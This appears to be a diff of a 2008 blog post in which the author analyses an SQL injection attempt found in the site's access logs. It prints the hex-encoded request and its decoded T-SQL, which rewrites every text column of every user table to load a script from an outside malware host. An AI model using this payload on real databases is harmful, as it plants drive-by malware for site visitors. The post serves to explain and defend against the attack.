@@ -18,33 +18,33 @@ published: true
 24.47.218.244 - - [28/Aug/2008:05:59:13 +0000] "GET /blog/saffer-brings-veggies-to-life
 /?';DECLARE%20@S%20CHAR(4000);SET%20@S=CAST(0x4445
 ...[truncated for brevity]...
-%20AS%20CHAR(4000));EXEC(@S); HTTP/1.1" 200 6191 "-" "Mozilla/4.0 (compatible; 
+%20AS%20CHAR(4000));EXEC(@S); HTTP/1.1" 200 6191 "-" "Mozilla/4.0 (compatible;
 MSIE 7.0; Windows NT 5.1; FunWebProducts; .NET CLR 1.1.4322)"
 </pre>
 <p>The truncated part is one huge long hexadecimal string. Being the curious person that I am, I investigated these requests a bit further.</p>
 <p><!--more-->For a start, the start of the string looks ominous: "<code>?'DECLARE%20@S%20CHAR(4000);SET%20@S=CAST</code>".  This looks like SQL code and it looks like it's trying to "<a href="http://dev.mysql.com/doc/refman/5.0/en/cast-functions.html#function_cast">cast</a>" (aka convert) the long hex string into a list of characters.</p>
 <p>So what does the long hex string translate to in good ol' ASCII?</p>
 <pre lang="sql">
-?DECLARE @T varchar(255)'@C varchar(4000) 
-DECLARE Table_Cursor CURSOR 
+?DECLARE @T varchar(255)'@C varchar(4000)
+DECLARE Table_Cursor CURSOR
     FOR select a.name'b.name from sysobjects a'syscolumns b where a.id=b.id and a.xtype='u'
-    and (b.xtype=99 or b.xtype=35 or b.xtype=231 or b.xtype=167) 
-    OPEN Table_Cursor 
-    FETCH NEXT FROM  Table_Cursor INTO @T'@C 
-        WHILE(@@FETCH_STATUS=0) 
-            BEGIN 
+    and (b.xtype=99 or b.xtype=35 or b.xtype=231 or b.xtype=167)
+    OPEN Table_Cursor
+    FETCH NEXT FROM  Table_Cursor INTO @T'@C
+        WHILE(@@FETCH_STATUS=0)
+            BEGIN
             exec('update ['+@T+'] set ['+@C+']=''"&gt;&lt;/title&gt;&lt;script src="
-            http://www0.douhunqn.cn/csrss/w.js"&gt;&lt;/script&gt;&lt;!--''+['+@C+'] where '+@C+' 
+            http://www0.douhunqn.cn/csrss/w.js"&gt;&lt;/script&gt;&lt;!--''+['+@C+'] where '+@C+'
             not like ''%"&gt;&lt;/title&gt;&lt;script src="http://www0.douhunqn.cn/csrss/w.js"&gt;
             &lt;/script&gt;&lt;!--''')
-            FETCH NEXT FROM  Table_Cursor INTO @T'@C 
-            END 
-    CLOSE Table_Cursor 
+            FETCH NEXT FROM  Table_Cursor INTO @T'@C
+            END
+    CLOSE Table_Cursor
 DEALLOCATE Table_Cursor
 </pre>
 <p>Now if that doesn't look like an SQL injection attack, then I don't know what does, and it looks like it's pointing to a machine in China.</p>
 <p>I didn't stop there, oh no.  I wanted to know what was in the file they were trying to inject into my site, so I downloaded the <code>w.js</code> file and checked it out.  </p>
 <p>In summary, it adds a 0x0 sized iframe pointing to <code>http://www0.douhunqn.cn/csrss/new.htm</code>.  Safe in the knowledge that no malware would be automatically installed on my host (I'm running Solaris), I bunged it into Firefox 3 to see what I got. Well, not much, except confirmation of what I suspected...</p>
-<p><img src="/assets/attacksite.png" alt="" title="Naughty Attack Site" class="center" /></p>
+<p><img src="/assets/attacksite.png" alt="Naughty Attack Site" title="Naughty Attack Site" class="center" /></p>
 <p>As you can see, Firefox picked up the site is dodgy and wouldn't let me view it without further intervention. Instead of viewing the page, I checked the reason it was detected as dodgy and was presented with <a href="http://safebrowsing.clients.google.com/safebrowsing/diagnostic?client=Firefox&hl=en-US&site=http://www0.douhunqn.cn/csrss/new.htm">Google's Safe Browsing Report</a> for the site which confirmed my suspicions 100%.</p>
 <p>Someone had attempted an SQL injection attack on my site in an attempt to get my site to start serving their malware.  Thankfully I'm relatively up to date on all my software, and don't seem to be running whatever application this attack was aiming at, so can be safe in the knowledge that the chances of one of these attacks succeeding is minimal.</p>
